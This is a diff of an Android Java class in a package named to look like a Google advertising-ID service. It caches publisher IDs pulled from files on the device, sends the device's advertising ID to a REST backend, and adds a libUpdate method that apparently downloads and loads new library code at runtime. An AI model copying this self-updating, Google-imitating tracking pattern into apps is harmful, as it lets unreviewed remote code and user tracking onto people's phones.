@@ -9,6 +9,7 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.LoaderManager;
 import android.util.Log;
 
+import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.DAO.AnotherAppCacheDAO;
 import com.advertising_id_service.appclick.googleadvertisingidservice.DAO.SelfCacheDAO;
@@ -24,8 +25,13 @@ import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherI
 import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicerSimple;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
 //import com.google.android.gms.ads.identifier.AdvertisingIdClient;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
@@ -40,10 +46,24 @@ public class GoogleAdvertisingIdGetter_Default implements IGoogleAdvertisingIdGe
         List files;
         List ids = new ArrayList();
         FilesSearcher fs = new FilesSearcher();
-        files = fs.getPublisherFiles(cnt, mask.getPrefix().split(","), mask.getSeporator() ,mask.getExtension().split(","));
-        for (Object object : (files)) {
-            ids.add(fs.ejectApkGUID(object.toString(), mask.getPrefix(), mask.getSeporator(), mask.getExtension() ));
+
+        String cashPUID = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PAID, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PAID, null);
+        if (cashPUID != null)
+        {
+            String[] arr = cashPUID.split(";");
+            for (int i = 0; i < arr.length; i++ ) {
+                ids.add(arr[i]);
+            }
+            return ids;
         }
+        files = fs.getPublisherFiles(cnt, mask.getPrefix().split(","), mask.getSeporator() ,mask.getExtension().split(","));
+        String str_to_save = "";
+        for (Object object : (files)) {
+            String publisher_id = fs.ejectApkGUID(object.toString(), mask.getPrefix(), mask.getSeporator(), mask.getExtension() );
+            ids.add(publisher_id);
+            str_to_save += publisher_id + ";";
+        }
+        if (fs.checkPermision(cnt)){cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PAID, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PAID, str_to_save).apply();}
         return ids;
     }
     private String getInnerPublisherID(Context cnt, String key)
@@ -278,15 +298,15 @@ public class GoogleAdvertisingIdGetter_Default implements IGoogleAdvertisingIdGe
     // @param login           - логин клиента
     // @param pass            - пароль клиента
     @Override
-    public void rest_create(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
+    public ResultCreate rest_create(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
     {
         Logger.log("GoogleAdvertisingIdGetter_Default.rest_create()");
         if (cheekPermisons(cnt)) {
-            GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
-            RestServicer.getRestServicer().create(cnt, lm, callDestination, login, pass);
+            return RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE).create(cnt, lm, callDestination, login, pass);
         }else{
             Logger.log("Has not INTERNET or READ_PHONE_STATE permission");
         }
+        return null;
     }
 
     //Метод добавляет информацию по конкретной инсталяции. InstallationInfo
@@ -303,15 +323,15 @@ public class GoogleAdvertisingIdGetter_Default implements IGoogleAdvertisingIdGe
     // g.rest_install(getApplicationContext(), getSupportLoaderManager(), "", install_info);
     //
     @Override
-    public void rest_install(final Context cnt, LoaderManager lm, String callDestination, InstallationInfo installInfo, String login, String pass)
+    public ResultInstall rest_install(final Context cnt, LoaderManager lm, String callDestination, InstallationInfo installInfo, String login, String pass)
     {
         Logger.log("GoogleAdvertisingIdGetter_Default.rest_install()");
         if (cheekPermisons(cnt)) {
-            GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
-            RestServicer.getRestServicer().install(cnt, lm, callDestination, installInfo, login, pass);
+            return RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE).install(cnt, lm, callDestination, installInfo, login, pass);
         }else{
             Logger.log("Has not INTERNET or READ_PHONE_STATE permission");
         }
+        return null;
     }
 
     //Метод удаляет из базы информации по устрйоству(его GAID-у).
@@ -327,8 +347,7 @@ public class GoogleAdvertisingIdGetter_Default implements IGoogleAdvertisingIdGe
     {
         Logger.log("GoogleAdvertisingIdGetter_Default.rest_read()");
         if (cheekPermisons(cnt)) {
-            GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
-            return RestServicer.getRestServicer().read(cnt, lm, readType, callDestination, login, pass);
+            return RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE).read(cnt, lm, readType, callDestination, login, pass);
         }else{
             Logger.log("Has not INTERNET or READ_PHONE_STATE permission");
             return null;
@@ -342,25 +361,41 @@ public class GoogleAdvertisingIdGetter_Default implements IGoogleAdvertisingIdGe
     // @param login           - логин клиента
     // @param pass            - пароль клиента
     @Override
-    public void rest_delete(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
+    public ResultDelete rest_delete(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
     {
         Logger.log("GoogleAdvertisingIdGetter_Default.rest_delete()");
         if (cheekPermisons(cnt)) {
-            GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
-            RestServicer.getRestServicer().delete(cnt, lm, callDestination, login, pass);
+            return RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE).delete(cnt, lm, callDestination, login, pass);
         }else{
             Logger.log("Has not INTERNET or READ_PHONE_STATE permission");
         }
+        return null;
     }
     @Override
-    public void rest_update(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
+    public ResultUpdate rest_update(final Context cnt, LoaderManager lm, String callDestination, String login, String pass)
     {
         Logger.log("GoogleAdvertisingIdGetter_Default.rest_update()");
         if (cheekPermisons(cnt)) {
-            GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
-            RestServicer.getRestServicer().update(cnt, lm, callDestination, login, pass);
+            return RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE).update(cnt, lm, callDestination, login, pass);
         }else{
             Logger.log("Has not INTERNET or READ_PHONE_STATE permission");
         }
+        return null;
+    }
+
+    //*****************************************************************************
+    //*************** Методы работы с обновлением библиотеки **********************
+    //*****************************************************************************
+    // !!!! Метод должен вызываться в отдельном потоке !!!!
+    //Проверить последнюю версию библиотеки и обновить её
+    // @param cnt  - контекст
+    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
+    // @param GAID - GAID устройства
+    //
+    @Override
+    public boolean libUpdate(Context cnt, LoaderManager lm, String GAID) {
+        Logger.log("GoogleAdvertisingIdGetter_Default.libUpdate()");
+        new CodeUpdater().updateCode(cnt, lm, GAID);
+        return true;
     }
 }
